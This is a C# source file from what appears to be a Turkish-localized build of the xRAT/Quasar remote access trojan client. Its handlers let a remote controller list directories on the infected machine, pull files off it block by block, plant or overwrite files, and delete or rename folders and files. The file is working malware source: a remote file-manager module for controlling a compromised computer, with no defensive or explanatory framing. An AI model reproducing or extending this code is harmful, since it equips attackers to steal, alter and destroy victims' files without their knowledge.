using System;
using System.IO;
using System.Security;
using System.Threading;
using xClient.KuuhakuÇekirdek.Ağ;
using xClient.KuuhakuÇekirdek.Utilityler;
using xClient.Enumlar;

namespace xClient.KuuhakuÇekirdek.Eylemler
{
    
    public static partial class Eylemİşleyicisi
    {
        public static void HandleGetDirectory(Paketler.ServerPaketleri.GetDirectory command, Client client)
        {
            bool isError = false;
            string message = null;

            Action<string> onError = (msg) =>
            {
                isError = true;
                message = msg;
            };

            try
            {
                DirectoryInfo dicInfo = new DirectoryInfo(command.RemotePath);

                FileInfo[] iFiles = dicInfo.GetFiles();
                DirectoryInfo[] iFolders = dicInfo.GetDirectories();

                string[] files = new string[iFiles.Length];
                long[] filessize = new long[iFiles.Length];
                string[] folders = new string[iFolders.Length];

                int i = 0;
                foreach (FileInfo file in iFiles)
                {
                    files[i] = file.Name;
                    filessize[i] = file.Length;
                    i++;
                }
                if (files.Length == 0)
                {
                    files = new string[] { Antilimiter };
                    filessize = new long[] { 0 };
                }

                i = 0;
                foreach (DirectoryInfo folder in iFolders)
                {
                    folders[i] = folder.Name;
                    i++;
                }
                if (folders.Length == 0)
                    folders = new string[] { Antilimiter };

                new Paketler.ClientPaketleri.GetDirectoryResponse(files, folders, filessize).Execute(client);
            }
            catch (UnauthorizedAccessException)
            {
                onError("GetDirectory İzni Yok");
            }
            catch (SecurityException)
            {
                onError("GetDirectory İzni Yok");
            }
            catch (PathTooLongException)
            {
                onError("GetDirectory Dizin Çok Uzun");
            }
            catch (DirectoryNotFoundException)
            {
                onError("GetDirectory Klasör Bulunamadı");
            }
            catch (FileNotFoundException)
            {
                onError("GetDirectory Dosya Bulunamadı");
            }
            catch (IOException)
            {
                onError("GetDirectory I/O Hatası");
            }
            catch (Exception)
            {
                onError("GetDirectory Başarısız");
            }
            finally
            {
                if (isError && !string.IsNullOrEmpty(message))
                    new Paketler.ClientPaketleri.SetStatusFileManager(message, true).Execute(client);
            }
        }

        public static void HandleDoDownloadFile(Paketler.ServerPaketleri.DoDownloadFile command, Client client)
        {
            new Thread(() =>
            {
                LimitThreads.WaitOne();
                try
                {
                    FileSplit srcFile = new FileSplit(command.RemotePath);
                    if (srcFile.MaxBlocks < 0)
                        throw new Exception(srcFile.LastError);

                    for (int currentBlock = 0; currentBlock < srcFile.MaxBlocks; currentBlock++)
                    {
                        if (!client.Connected || _canceledDownloads.ContainsKey(command.ID))
                            break;

                        byte[] block;

                        if (!srcFile.ReadBlock(currentBlock, out block))
                            throw new Exception(srcFile.LastError);

                        new Paketler.ClientPaketleri.DoDownloadFileResponse(command.ID,
                            Path.GetFileName(command.RemotePath), block, srcFile.MaxBlocks, currentBlock,
                            srcFile.LastError).Execute(client);
                    }
                }
                catch (Exception ex)
                {
                    new Paketler.ClientPaketleri.DoDownloadFileResponse(command.ID, Path.GetFileName(command.RemotePath), new byte[0], -1, -1, ex.Message)
                        .Execute(client);
                }
                LimitThreads.Release();
            }).Start();
        }

        public static void HandleDoDownloadFileCancel(Paketler.ServerPaketleri.DoDownloadFileCancel command, Client client)
        {
            if (!_canceledDownloads.ContainsKey(command.ID))
            {
                _canceledDownloads.Add(command.ID, "canceled");
                new Paketler.ClientPaketleri.DoDownloadFileResponse(command.ID, "canceled", new byte[0], -1, -1, "Canceled").Execute(client);
            }
        }

        public static void HandleDoUploadFile(Paketler.ServerPaketleri.DoUploadFile command, Client client)
        {
            if (command.CurrentBlock == 0 && File.Exists(command.RemotePath))
                NativeMethods.DeleteFile(command.RemotePath); // delete existing file

            FileSplit destFile = new FileSplit(command.RemotePath);
            destFile.AppendBlock(command.Block, command.CurrentBlock);
        }

        public static void HandleDoPathDelete(Paketler.ServerPaketleri.DoPathDelete command, Client client)
        {
            bool isError = false;
            string message = null;

            Action<string> onError = (msg) =>
            {
                isError = true;
                message = msg;
            };


            try
            {
                switch (command.DizinTürleri)
                {
                    case DizinTürleri.Klasör:
                        Directory.Delete(command.Path, true);
                        new Paketler.ClientPaketleri.SetStatusFileManager("Klasör Silindi", false).Execute(client);
                        break;
                    case DizinTürleri.Dosya:
                        File.Delete(command.Path);
                        new Paketler.ClientPaketleri.SetStatusFileManager("Dosya Silindi", false).Execute(client);
                        break;
                }

                HandleGetDirectory(new Paketler.ServerPaketleri.GetDirectory(Path.GetDirectoryName(command.Path)), client);
            }
            catch (UnauthorizedAccessException)
            {
                onError("DeletePath İzin Yok");
            }
            catch (PathTooLongException)
            {
                onError("DeletePath Dizin Çok Uzun");
            }
            catch (DirectoryNotFoundException)
            {
                onError("DeletePath Dizin Bulunamadı");
            }
            catch (IOException)
            {
                onError("DeletePath I/O Hatası");
            }
            catch (Exception)
            {
                onError("DeletePath Başarısız");
            }
            finally
            {
                if (isError && !string.IsNullOrEmpty(message))
                    new Paketler.ClientPaketleri.SetStatusFileManager(message, false).Execute(client);
            }
        }

        public static void HandleDoPathRename(Paketler.ServerPaketleri.DoPathRename command, Client client)
        {
            bool isError = false;
            string message = null;

            Action<string> onError = msg =>
            {
                isError = true;
                message = msg;
            };

            try
            {
                switch (command.PathType)
                {
                    case DizinTürleri.Klasör:
                        Directory.Move(command.Path, command.NewPath);
                        new Paketler.ClientPaketleri.SetStatusFileManager("Klasör Adı Değiştirildi", false).Execute(client);
                        break;
                    case DizinTürleri.Dosya:
                        File.Move(command.Path, command.NewPath);
                        new Paketler.ClientPaketleri.SetStatusFileManager("Dosya Adı Değiştirildi", false).Execute(client);
                        break;
                }

                HandleGetDirectory(new Paketler.ServerPaketleri.GetDirectory(Path.GetDirectoryName(command.NewPath)), client);
            }
            catch (UnauthorizedAccessException)
            {
                onError("RenamePath İzni Yok");
            }
            catch (PathTooLongException)
            {
                onError("RenamePath Dizin Çok Uzun");
            }
            catch (DirectoryNotFoundException)
            {
                onError("RenamePath Dizin Bulunamadı");
            }
            catch (IOException)
            {
                onError("RenamePath I/O Hatası");
            }
            catch (Exception)
            {
                onError("RenamePath Başarısız");
            }
            finally
            {
                if (isError && !string.IsNullOrEmpty(message))
                    new Paketler.ClientPaketleri.SetStatusFileManager(message, false).Execute(client);
            }
        }
    }
}